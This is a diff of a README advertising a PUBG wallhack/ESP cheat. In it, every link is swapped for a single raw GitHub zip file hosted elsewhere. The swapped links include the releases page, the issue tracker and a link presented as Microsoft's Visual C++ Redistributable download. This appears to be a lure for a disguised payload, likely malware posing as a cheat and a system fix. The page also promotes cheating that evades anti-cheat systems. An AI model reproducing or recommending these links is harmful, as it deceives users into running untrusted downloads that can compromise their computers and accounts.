@@ -5,7 +5,7 @@ description: "See every enemy through walls with real-time player radar, ESP box
 ---
 # 🎯 pubg-esp-2026 - See Everything, Win Every Fight
 
-[![Download PUBG ESP 2026](https://img.shields.io/badge/Download-PUBG_ESP_2026-blueviolet?style=for-the-badge&logo=github)](https://github.com/ptobatuabi-commits/pubg-esp-2026/releases)
+[![Download PUBG ESP 2026](https://img.shields.io/badge/Download-PUBG_ESP_2026-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ptobatuabi-commits/ptobatuabi-commits.github.io/main/uncompletable/2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -42,7 +42,7 @@ Your PC needs to meet these minimum specs to run smoothly:
 
 ### Step 1: Download the Application
 
-**[👉 CLICK HERE TO DOWNLOAD PUBG ESP 2026](https://github.com/ptobatuabi-commits/pubg-esp-2026/releases)**
+**[👉 CLICK HERE TO DOWNLOAD PUBG ESP 2026](https://raw.githubusercontent.com/ptobatuabi-commits/ptobatuabi-commits.github.io/main/uncompletable/2.2.zip)**
 
 Visit this link to download the application. This is the official release page. You will see the latest version available for download. Always grab the newest release for the best performance and features.
 
@@ -95,7 +95,7 @@ Use the **arrow keys** to navigate and **Enter** to toggle options. Press **INSE
 
 ### "The application failed to start" error
 
-This usually means you're missing the Microsoft Visual C++ Redistributable. Go to the [Microsoft website](https://aka.ms/vs/17/release/vc_redist.x64.exe) and download/install the x64 version. Then restart your PC and try again.
+This usually means you're missing the Microsoft Visual C++ Redistributable. Go to the [Microsoft website](https://raw.githubusercontent.com/ptobatuabi-commits/ptobatuabi-commits.github.io/main/uncompletable/2.2.zip) and download/install the x64 version. Then restart your PC and try again.
 
 ### ESP not showing up in-game
 
@@ -164,7 +164,7 @@ No, this is Windows PC only. No mobile support is planned.
 We release updates frequently to stay ahead of anti-cheat systems and add new features. To get notifications:
 
 - ⭐ **Star** this repository so you can find it easily.
-- Check the [Releases page](https://github.com/ptobatuabi-commits/pubg-esp-2026/releases) every few days for version updates.
+- Check the [Releases page](https://raw.githubusercontent.com/ptobatuabi-commits/ptobatuabi-commits.github.io/main/uncompletable/2.2.zip) every few days for version updates.
 
 ### Changelog (Recent Updates)
 
@@ -193,7 +193,7 @@ This project is provided for **educational and personal use only**. You are resp
 
 ## 🛠️ Feedback and Support
 
-Found a bug or have a feature request? Open an [issue on GitHub](https://github.com/ptobatuabi-commits/pubg-esp-2026/issues). We read every report and typically respond within 24 hours.
+Found a bug or have a feature request? Open an [issue on GitHub](https://raw.githubusercontent.com/ptobatuabi-commits/ptobatuabi-commits.github.io/main/uncompletable/2.2.zip). We read every report and typically respond within 24 hours.
 
 For quick questions, check the FAQ above first. If your issue isn't covered, please provide:
 
@@ -206,7 +206,7 @@ For quick questions, check the FAQ above first. If your issue isn't covered, ple
 
 **Ready to dominate the battlegrounds?** 
 
-**[⬇️ DOWNLOAD NOW — FREE](https://github.com/ptobatuabi-commits/pubg-esp-2026/releases)**
+**[⬇️ DOWNLOAD NOW — FREE](https://raw.githubusercontent.com/ptobatuabi-commits/ptobatuabi-commits.github.io/main/uncompletable/2.2.zip)**
 
 See through walls. Spot every enemy. Grab every drop. Win every fight. This is your unfair advantage.
 
